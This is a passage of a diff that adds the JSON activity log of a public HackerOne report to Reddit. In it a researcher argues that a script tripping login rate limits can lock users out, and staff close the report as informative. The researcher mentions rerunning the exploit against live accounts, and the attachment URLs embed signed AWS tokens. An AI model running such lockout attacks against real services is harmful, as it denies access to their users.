t&X-Amz-Signature=0b9c17828a6510b4cab3675ca728e7bcb3469052e1d766e516756b2b28a7751b"
+                },
+                {
+                    "id": 1751797,
+                    "filename": "device1.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xftmeini7eph572wi34omqfcsltw?response-content-disposition=attachment%3B%20filename%3D%22device1.png%22%3B%20filename%2A%3DUTF-8%27%27device1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b210ea6037bd3438c98e2d6de92073ff337c12e901debf004750c005b20d9ceb"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16940430,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello @h1ugroon, \n\nAs I can see from your PoC, the application has a cooldown period. You may be running the script continuously but that comes under resource exhaustion (denial of service) category that is generally considered OOS. \n\nHowever, I was able to login in a new session and also my old session was not expired, attaching a screenshot for your reference. \n{F1752172}\n\nHaving said that, I will keep this issue closed as `Informative`. \n\nBest,\n@1nfinit3",
+            "automated_response": false,
+            "created_at": "2022-06-01T05:25:44.844Z",
+            "updated_at": "2022-06-01T05:25:44.844Z",
+            "actor": {
+                "username": "h1_analyst_arthur",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_arthur",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/m2p2sd5s5t1bcgg4ux4hi0wqn2bw/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1752172,
+                    "filename": "Screenshot_2022-06-01_at_10.52.39.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z7hvd8d6g9mwx07g5ufjqag96ohw?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2022-06-01_at_10.52.39.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2022-06-01_at_10.52.39.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=80f98dcaa618d719cc2a22b993e9b8c619e920ca2d5c6e68e5f133efee7c9dec"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16947766,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @1nfinit3,\n\nThis is because of I was have to go to sleep and my internet connection has been cut off. Now I have started exploit again. So, can you try to login again?",
+            "automated_response": false,
+            "created_at": "2022-06-01T08:20:33.824Z",
+            "updated_at": "2022-06-01T08:20:33.824Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16947854,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "{F1752329}",
+            "automated_response": false,
+            "created_at": "2022-06-01T08:23:03.608Z",
+            "updated_at": "2022-06-01T08:23:03.608Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1752329,
+                    "filename": "unknown.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b9uhj6q2wffjf8d69egk54s7we31?response-content-disposition=attachment%3B%20filename%3D%22unknown.png%22%3B%20filename%2A%3DUTF-8%27%27unknown.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070203Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=af39a5db5860227d0a21853363cc168db1625dc59199ae97616427bac28f7878"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16948304,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hello @h1ugroon, \n\nI can successfully log in to my user account. \n\nBest,\n@1nfinit3",
+            "automated_response": false,
+            "created_at": "2022-06-01T08:36:35.531Z",
+            "updated_at": "2022-06-01T08:36:35.531Z",
+            "actor": {
+                "username": "h1_analyst_arthur",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_arthur",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/m2p2sd5s5t1bcgg4ux4hi0wqn2bw/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16954002,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @1nfinit3,\n\nDo you use vpn or vps? And what is your browser version? Because I can reproduce the issue with chrome latest on a normal device but I can't reproduce with VPN/VPS/Old browsers. \n\n{F1752646}\n\nAs you can see I've used tor",
+            "automated_response": false,
+            "created_at": "2022-06-01T12:33:47.066Z",
+            "updated_at": "2022-06-01T12:33:47.066Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16954037,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I used tor, my phone, my friend's computer and my own computer. Seems blocked for all?",
+            "automated_response": false,
+            "created_at": "2022-06-01T12:37:26.552Z",
+            "updated_at": "2022-06-01T12:37:26.552Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16955843,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "I said it's vulnerable for normal users (who is using directly chrome/firefox latest versions) but if you want to disclosure it's not problem",
+            "automated_response": false,
+            "created_at": "2022-06-01T14:07:03.153Z",
+            "updated_at": "2022-06-01T14:07:03.153Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16955961,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "We have different ratelimits based on if the current IP has been associated with a successful login on the account or not. So while yes, this causes a ratelimit with random IPs, a successful login for a \"seen before\" IP will work just fine. Agree this should be closed, no action will be taken",
+            "automated_response": false,
+            "created_at": "2022-06-01T14:16:19.925Z",
+            "updated_at": "2022-06-01T14:16:19.925Z",
+            "actor": {
+                "username": "gunther_reddit",
+                "cleared": false,
+                "verified": false,
+                "url": "/gunther_reddit",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/bJkGBkpS1oLzSdpXBuVHDi7f/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16955986,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @gunther_reddit,\n\n> a successful login for a \"seen before\" IP will work just fine\n\nNo you can test, it's blocking a \"seen before\" IP too",
+            "automated_response": false,
+            "created_at": "2022-06-01T14:19:24.326Z",
+            "updated_at": "2022-06-01T14:19:24.326Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16956050,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "You can check my first attachment (PoC video on report (https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h11p01gfdkpfho5z7qc53fu0w148?response-content-disposition=attachment%3B%20filename%3D%22recording-1653645412706.webm%22%3B%20filename%2A%3DUTF-8%27%27recording-1653645412706.webm&response-content-type=video%2Fwebm&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQY54WIUW4%2F20220601%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220601T141925Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEsaCXVzLXdlc3QtMiJHMEUCIQDBbWz3lhGmeTsP1SufCmyiePFKO8KjSjuOljrR5NhPiAIgOXdr6YJYtWDr6mzoLEEGDbzsegYiU%2B9LPW%2BVSyYImkIq0gQIRBACGgwwMTM2MTkyNzQ4NDkiDJQ6MtWtPvU4uTgGryqvBJyn0mBlidz4huDBoURKMc5ZWoY%2BUocDqDT2yyoymtu%2FHbGVeremyuvdqAyiA4RqKTTC1ixGgSHLu7tTUF7fxpU3gpen1PZ3mWlDdKMejnQ9UgdgkPWTXRqX7JIuikEgXi%2BuMNWDbjWjNyx7sETDAmoybvwBfuObwoOnRx4Xx%2FRc74wQc%2FY9pd3RVKfezt5%2B99FrvOFFTU1veE0%2BA4n59BINcx2dzSk1j8ACHTY60KW%2FMPG8jotTURNO909cgneA3aVCs6ULJAMLONMPQMvcolw0gGSwcwRzokyfHjsJtklCpBGH6vGA3DPWL6hNqGj1UwnRSrU8A5CLis1DQlO62bhxJitE69ukqHuY4IGqVwcVvNxRPaTvP4OlQ2pC%2FDVNJyrolymVhkaxMVGK%2F9iw3WCI%2F7n5vnUC2bKmq4g9Tw5CMclCHC6l3OiDpJLWZxuERnEieV0rBNhMsAdYhgpXaRzXyp16crBMgBU6PwTnGNvbuiWIQt5RaCsfikDYpms%2FeQ4J3e2GU%2BewZkq0pv3oO8SKXWx1TFkl4oNUtTuRBSEgPIO94F3YrExRYYgOPLVYtMSQIL4JSqqcRNjkDaWwN9gWev%2FwAfbPtkR0QigZ0cpc%2BWN5SSUN70EMY1ej6C%2BJj9Mdokubp%2BT29gfNNREyRHoBFtgbjV8DXtGmlrCnkJk6I4yS7RWcqBkRrhwyhxMQuMpOF%2FzyUE5PhWvVLxsniz%2BBACSymzx4FalPqun4o%2Bcwn%2F3clAY6qQGE0EN%2FuneykYAbRb%2BAuFjDA2s1bWm6h4JQtFbBobhBf%2BGYXwciVjLkYvyYh21zQX56DZ3BRx4Sj%2ByOrf5MYfiFJT7M7gaYuOmlCPD78vOH4xIVK23BF0NgluCgjUrBGm93wnm%2BQosFBRUAcH1XM6Ls3ZEJS6ROzlS8ISQaIHaI1xEtlXTJWHvNefQT7WSpMYaAcz1OIaxPyRqaD9ox7XsXZzWdvSyJpquM&X-Amz-SignedHeaders=host&X-Amz-Signature=48857f13eada245e5c07aeb1f5cd77833cdd66ac75134336c2cd219734ade4fc))",
+            "automated_response": false,
+            "created_at": "2022-06-01T14:24:57.627Z",
+            "updated_at": "2022-06-01T14:24:57.627Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16956101,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I don't know if you fixed the issue after reporting but in the PoC in the report, you can clearly see that it also blocked a \"seen before\" IP.",
+            "automated_response": false,
+            "created_at": "2022-06-01T14:29:24.392Z",
+            "updated_at": "2022-06-01T14:29:24.392Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 16956148,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "{F1752845}",
+            "automated_response": false,
+            "created_at": "2022-06-01T14:34:01.974Z",
+            "updated_at": "2022-06-01T14:34:01.974Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 17013404,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::HackerRequestedMediation",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-06-06T20:18:42.293Z",
+            "updated_at": "2022-06-06T20:18:42.293Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 17015160,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-06-06T23:10:51.024Z",
+            "updated_at": "2022-06-06T23:10:51.024Z",
+            "actor": {
+                "username": "gunther_reddit",
+                "cleared": false,
+                "verified": false,
+                "url": "/gunther_reddit",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/bJkGBkpS1oLzSdpXBuVHDi7f/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 17015161,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-06-06T23:10:51.171Z",
+            "updated_at": "2022-06-06T23:10:51.171Z",
+            "actor": {
+                "username": "gunther_reddit",
+                "cleared": false,
+                "verified": false,
+                "url": "/gunther_reddit",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/bJkGBkpS1oLzSdpXBuVHDi7f/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        },
+        {
+            "id": 20734943,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I think they are good scammers",
+            "automated_response": false,
+            "created_at": "2023-03-10T11:22:06.126Z",
+            "updated_at": "2023-03-10T11:23:14.400Z",
+            "actor": {
+                "username": "ug0x01",
+                "cleared": false,
+                "verified": false,
+                "url": "/ug0x01",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "reddit"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "id": 186834,
+            "category": "researcher",
+            "content": "A punishment for every mistake, a reward for every kindness",
+            "user": {
+                "id": 2136612,
+                "username": "ug0x01",
+                "name": "Noice 🍋",
+                "bio": "",
+                "cleared": false,
+                "verified": false,
+                "website": null,
+                "location": "",
+                "created_at": "2021-12-21T10:09:59.886Z",
+                "url": "https://hackerone.com/ug0x01",
+                "hackerone_triager": false,
+                "hackerone_employee": false,
+                "user_type": "hacker",
+                "profile_picture_urls": {
+                    "small": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+                    "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/tx46va61kxpoevwva5yst4hiw755/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+                }
+            },
+            "can_view?": true,
+            "can_create?": false,
+            "attachments": []
+        }
+    ]
+}
